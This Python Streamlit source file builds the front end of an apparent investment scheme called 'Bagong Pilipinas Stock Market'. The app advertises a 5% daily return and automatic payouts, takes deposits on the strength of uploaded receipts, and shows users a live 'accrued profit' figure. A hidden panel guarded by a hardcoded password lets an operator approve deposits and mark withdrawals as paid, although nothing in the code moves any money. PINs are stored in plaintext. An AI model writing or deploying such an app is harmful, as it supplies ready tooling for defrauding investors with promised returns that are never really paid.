import streamlit as st
import json
import os
from datetime import datetime, timedelta
import time
import random
import pandas as pd

# --- 1. SESSION INITIALIZER ---
if 'user' not in st.session_state: st.session_state.user = None
if 'page' not in st.session_state: st.session_state.page = "main"

# --- 2. DATA ENGINE ---
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)

# --- 3. UI STYLING ---
st.set_page_config(page_title="BPSM Official", layout="wide")
st.markdown("""
    <style>
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }
    .user-box { text-align: center; padding: 30px 10px; background: #111217; border-bottom: 1px solid #2a2b30; }
    .balance-val { color: #0dcf70; font-size: 3.5rem; font-weight: 900; margin: 5px 0; }
    .section-header { background: #1c1e24; padding: 12px 20px; margin-top: 25px; border-left: 5px solid #0dcf70; font-weight: bold; text-transform: uppercase; color: #0dcf70; }
    .ticker-wrap { background: #000; color: #0dcf70; padding: 12px 0; position: fixed; bottom: 0; width: 100%; font-size: 0.85rem; border-top: 1px solid #2a2b30; z-index: 999; }
    </style>
    """, unsafe_allow_html=True)

# --- 4. ACCESS CONTROL ---
if st.session_state.user is None:
    st.markdown("<div style='background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%); padding: 40px 20px; text-align: center;'><h1>BAGONG PILIPINAS<br>STOCK MARKET</h1><p>Automatic 24-Hour Payouts | 5% Daily ROI</p></div>", unsafe_allow_html=True)
    t1, t2 = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    with t1:
        ln = st.text_input("INVESTOR NAME").upper()
        lp = st.text_input("SECURE PIN", type="password", max_chars=6)
        if st.button("VERIFY & ACCESS"):
            reg = load_registry()
            if ln in reg and reg[ln]['pin'] == lp:
                st.session_state.user = ln
                st.rerun()
    with t2:
        rn = st.text_input("FULL LEGAL NAME").upper()
        rp = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
        if st.button("CREATE ACCOUNT"):
            if rn and len(rp) == 6:
                update_user(rn, {"pin": rp, "wallet": 0.0, "inv": [], "tx": []})
                st.success("Account Created!")

# --- 5. INVESTOR PORTAL ---
else:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    # --- AUTOMATIC 24H PAYOUT & HISTORY LOGGING ---
    active_inv = []
    payout_triggered = False
    
    for i in data.get('inv', []):
        end_time = datetime.fromisoformat(i['end'])
        if now >= end_time: 
            profit_amt = i['amt'] * 0.05
            total_return = i['amt'] + profit_amt
            
            # Update Wallet
            data['wallet'] += total_return
            
            # Log exact profit history for this specific deposit
            data.setdefault('tx', []).append({
                "date": end_time.strftime("%Y-%m-%d %H:%M"),
                "type": "PROFIT CREDIT",
                "amt": total_return,
                "status": "SUCCESS"
            })
            payout_triggered = True
        else: 
            active_inv.append(i)
    
    if payout_triggered:
        data['inv'] = active_inv
        update_user(name, data)
        st.rerun()

    # UI Header
    st.markdown(f"<div class='user-box'><p style='color:#8c8f99;'>WITHDRAWABLE BALANCE</p><h1 class='balance-val'>₱{data['wallet']:,.2f}</h1><p style='color:#8c8f99;'>Account: {name}</p></div>", unsafe_allow_html=True)
    
    col_act1, col_act2 = st.columns(2)
    with col_act1:
        if st.button("📥 DEPOSIT CAPITAL"): 
            st.session_state.page = "dep"
            st.rerun()
    with col_act2:
        # Minimum withdrawal logic
        if data['wallet'] >= 1000:
            if st.button("📤 WITHDRAW"): 
                st.session_state.page = "wd"
                st.rerun()
        else:
            st.button("📤 WITHDRAW (Min. ₱1,000)", disabled=True)

    # --- DEPOSIT PAGE ---
    if st.session_state.page == "dep":
        st.markdown("<div class='section-header'>📥 FUND YOUR ACCOUNT</div>")
        dep_amt = st.number_input("Amount (PHP)", min_value=100.0)
        receipt = st.file_uploader("Upload Receipt", type=['jpg', 'png', 'jpeg'])
        if st.button("SUBMIT FOR APPROVAL"):
            if receipt:
                data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "DEPOSIT", "amt": dep_amt, "status": "PENDING"})
                update_user(name, data)
                st.success("Submitted! Awaiting Admin Verification.")
                time.sleep(2); st.session_state.page = "main"; st.rerun()
        if st.button("⬅️ CANCEL"): st.session_state.page = "main"; st.rerun()

    # --- WITHDRAWAL PAGE ---
    if st.session_state.page == "wd":
        st.markdown("<div class='section-header'>📤 WITHDRAW FUNDS</div>")
        wd_amt = st.number_input("Withdraw Amount (Min 1,000)", min_value=1000.0, max_value=data['wallet'])
        if st.button("REQUEST WITHDRAWAL"):
            data['wallet'] -= wd_amt
            data.setdefault('tx', []).append({"date": now.strftime("%Y-%m-%d %H:%M"), "type": "WITHDRAW", "amt": wd_amt, "status": "PENDING"})
            update_user(name, data)
            st.success("Withdrawal request sent!")
            time.sleep(2); st.session_state.page = "main"; st.rerun()
        if st.button("⬅️ CANCEL"): st.session_state.page = "main"; st.rerun()

    # --- ACTIVE CYCLES ---
    if st.session_state.page == "main":
        st.markdown("<div class='section-header'>⏳ ACTIVE 24H CYCLES (5% ROI)</div>", unsafe_allow_html=True)
        if not active_inv:
            st.write("No active cycles.")
        else:
            for t in active_inv:
                start_t = datetime.fromisoformat(t['start'])
                end_t = datetime.fromisoformat(t['end'])
                prog = min((now - start_t).total_seconds() / (end_t - start_t).total_seconds(), 1.0)
                live_int = (t['amt'] * 0.05) * prog
                rem = end_t - now

                st.markdown(f"""
                <div style='background:#1c1e24; padding:15px; border-radius:15px; border:1px solid #3a3d46; margin-bottom:10px;'>
                    <div style='display:flex; justify-content:space-between;'>
                        <span>Principal: ₱{t['amt']:,}</span>
                        <span style='color:#0dcf70;'>Accrued: +₱{live_int:,.2f}</span>
                    </div>
                    <div style='color:#0dcf70; font-size:1.8rem; font-weight:bold; text-align:center;'>{str(rem).split(".")[0]}</div>
                </div>
                """, unsafe_allow_html=True)

        st.markdown("<div class='section-header'>📜 COMPLETE HISTORY</div>", unsafe_allow_html=True)
        for t in reversed(data.get('tx', [])):
            st.write(f"**{t['date']}** | {t['type']} | ₱{t['amt']:,} | `{t['status']}`")

    if st.sidebar.button("LOGOUT"):
        st.session_state.user = None
        st.rerun()

# --- 6. BOSS PANEL ---
st.divider()
with st.expander("⚠️"):
    if st.button("ENTER ADMIN"):
        if st.text_input("Key", type="password") == "Orange01!":
            st.session_state.is_boss = True; st.rerun()

if st.session_state.get("is_boss"):
    all_users = load_registry()
    st.markdown("### 👑 ADMIN APPROVALS")
    
    for u_name, u_info in all_users.items():
        for idx, tx in enumerate(u_info.get('tx', [])):
            if tx['status'] == "PENDING":
                st.warning(f"{tx['type']}: {u_name} | ₱{tx['amt']:,}")
                if st.button(f"APPROVE {u_name}", key=f"app_{u_name}_{idx}"):
                    if tx['type'] == "DEPOSIT":
                        all_users[u_name]['tx'][idx]['status'] = "SUCCESS"
                        start = datetime.now()
                        all_users[u_name].setdefault('inv', []).append({
                            "amt": tx['amt'], "start": start.isoformat(), "end": (start + timedelta(hours=24)).isoformat()
                        })
                    else: # Withdrawal approval
                        all_users[u_name]['tx'][idx]['status'] = "SUCCESS"
                    
                    with open(REGISTRY_FILE, "w") as f: json.dump(all_users, f, default=str)
                    st.success("Action Verified!"); st.rerun()

time.sleep(1)
st.rerun()
